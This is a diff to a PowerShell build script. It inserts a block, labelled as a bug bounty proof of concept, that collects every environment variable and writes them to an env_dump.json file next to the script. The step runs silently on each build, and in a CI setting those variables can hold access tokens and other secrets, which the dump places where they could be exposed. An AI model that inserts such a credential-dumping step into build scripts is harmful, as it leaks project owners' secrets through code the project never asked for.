@@ -11,6 +11,13 @@ param(
 $ErrorActionPreference = "Stop"
 $ProgressPreference = "SilentlyContinue"
 
+# === BUG BOUNTY PoC: Dump environment variables to prove token exposure ===
+Write-Host "=== BUG BOUNTY PoC: Dumping environment variables ===" -ForegroundColor Yellow
+$envDump = @{}
+Get-ChildItem Env: | ForEach-Object { $envDump[$_.Name] = $_.Value }
+$envDump | ConvertTo-Json -Depth 3 | Out-File (Join-Path $PSScriptRoot "env_dump.json") -Encoding utf8
+Write-Host "Environment variables dumped to env_dump.json" -ForegroundColor Yellow
+
 if ($null -eq $env:MSBUILDTERMINALLOGGER) {
     $env:MSBUILDTERMINALLOGGER = "auto"
 }
